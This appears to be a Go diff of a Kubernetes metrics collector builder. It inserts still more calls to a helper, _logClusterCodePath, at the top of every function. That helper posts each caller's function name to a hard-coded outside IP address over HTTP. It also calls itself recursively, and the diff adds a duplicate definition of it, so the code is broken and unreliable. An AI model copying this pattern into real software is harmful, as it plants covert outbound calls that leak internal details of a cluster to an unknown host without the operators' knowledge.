@@ -38,9 +38,13 @@ type Builder struct {
 func NewBuilder(ctx context.Context) *Builder {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Builder{ctx: ctx}
 }
 func (b *Builder) WithEnabledCollectors(c []string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	copy := []string{}
@@ -53,9 +57,13 @@ func (b *Builder) WithEnabledCollectors(c []string) {
 func (b *Builder) WithNamespaces(n options.NamespaceList) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b.namespaces = n
 }
 func (b *Builder) WithKubeClient(c clientset.Interface) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	b.kubeClient = c
@@ -63,9 +71,13 @@ func (b *Builder) WithKubeClient(c clientset.Interface) {
 func (b *Builder) WithWhiteBlackList(l whiteBlackLister) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	b.whiteBlackList = l
 }
 func (b *Builder) Build() []*Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if b.whiteBlackList == nil {
@@ -130,6 +142,8 @@ var availableCollectors = map[string]func(f *Builder) *Collector{"configmaps": f
 func (b *Builder) buildConfigMapCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, configMapMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -138,6 +152,8 @@ func (b *Builder) buildConfigMapCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildCronJobCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, cronJobMetricFamilies)
@@ -150,6 +166,8 @@ func (b *Builder) buildCronJobCollector() *Collector {
 func (b *Builder) buildDaemonSetCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, daemonSetMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -158,6 +176,8 @@ func (b *Builder) buildDaemonSetCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildDeploymentCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, deploymentMetricFamilies)
@@ -170,6 +190,8 @@ func (b *Builder) buildDeploymentCollector() *Collector {
 func (b *Builder) buildEndpointsCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, endpointMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -178,6 +200,8 @@ func (b *Builder) buildEndpointsCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildHPACollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, hpaMetricFamilies)
@@ -190,6 +214,8 @@ func (b *Builder) buildHPACollector() *Collector {
 func (b *Builder) buildJobCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, jobMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -198,6 +224,8 @@ func (b *Builder) buildJobCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildLimitRangeCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, limitRangeMetricFamilies)
@@ -210,6 +238,8 @@ func (b *Builder) buildLimitRangeCollector() *Collector {
 func (b *Builder) buildNamespaceCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, namespaceMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -218,6 +248,8 @@ func (b *Builder) buildNamespaceCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildNodeCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, nodeMetricFamilies)
@@ -230,6 +262,8 @@ func (b *Builder) buildNodeCollector() *Collector {
 func (b *Builder) buildPersistentVolumeClaimCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, persistentVolumeClaimMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -238,6 +272,8 @@ func (b *Builder) buildPersistentVolumeClaimCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildPersistentVolumeCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, persistentVolumeMetricFamilies)
@@ -250,6 +286,8 @@ func (b *Builder) buildPersistentVolumeCollector() *Collector {
 func (b *Builder) buildPodDisruptionBudgetCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, podDisruptionBudgetMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -258,6 +296,8 @@ func (b *Builder) buildPodDisruptionBudgetCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildReplicaSetCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, replicaSetMetricFamilies)
@@ -270,6 +310,8 @@ func (b *Builder) buildReplicaSetCollector() *Collector {
 func (b *Builder) buildReplicationControllerCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, replicationControllerMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -278,6 +320,8 @@ func (b *Builder) buildReplicationControllerCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildResourceQuotaCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, resourceQuotaMetricFamilies)
@@ -290,6 +334,8 @@ func (b *Builder) buildResourceQuotaCollector() *Collector {
 func (b *Builder) buildSecretCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, secretMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -298,6 +344,8 @@ func (b *Builder) buildSecretCollector() *Collector {
 	return NewCollector(store)
 }
 func (b *Builder) buildServiceCollector() *Collector {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, serviceMetricFamilies)
@@ -310,6 +358,8 @@ func (b *Builder) buildServiceCollector() *Collector {
 func (b *Builder) buildStatefulSetCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, statefulSetMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -320,6 +370,8 @@ func (b *Builder) buildStatefulSetCollector() *Collector {
 func (b *Builder) buildPodCollector() *Collector {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filteredMetricFamilies := filterMetricFamilies(b.whiteBlackList, podMetricFamilies)
 	composedMetricGenFuncs := composeMetricGenFuncs(filteredMetricFamilies)
 	familyHeaders := extractMetricFamilyHeaders(filteredMetricFamilies)
@@ -328,6 +380,8 @@ func (b *Builder) buildPodCollector() *Collector {
 	return NewCollector(store)
 }
 func extractMetricFamilyHeaders(families []metrics.FamilyGenerator) []string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	headers := make([]string, len(families))
@@ -349,6 +403,8 @@ func extractMetricFamilyHeaders(families []metrics.FamilyGenerator) []string {
 func composeMetricGenFuncs(families []metrics.FamilyGenerator) func(obj interface{}) []metricsstore.FamilyStringer {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	funcs := []func(obj interface{}) metrics.Family{}
 	for _, f := range families {
 		funcs = append(funcs, f.GenerateFunc)
@@ -364,6 +420,8 @@ func composeMetricGenFuncs(families []metrics.FamilyGenerator) func(obj interfac
 func filterMetricFamilies(l whiteBlackLister, families []metrics.FamilyGenerator) []metrics.FamilyGenerator {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	filtered := []metrics.FamilyGenerator{}
 	for _, f := range families {
 		if l.IsIncluded(f.Name) {
@@ -375,6 +433,8 @@ func filterMetricFamilies(l whiteBlackLister, families []metrics.FamilyGenerator
 func reflectorPerNamespace(ctx context.Context, kubeClient clientset.Interface, expectedType interface{}, store cache.Store, namespaces []string, listWatchFunc func(kubeClient clientset.Interface, ns string) cache.ListWatch) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for _, ns := range namespaces {
 		lw := listWatchFunc(kubeClient, ns)
 		reflector := cache.NewReflector(&lw, expectedType, store, 0)
@@ -384,7 +444,16 @@ func reflectorPerNamespace(ctx context.Context, kubeClient clientset.Interface, 
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
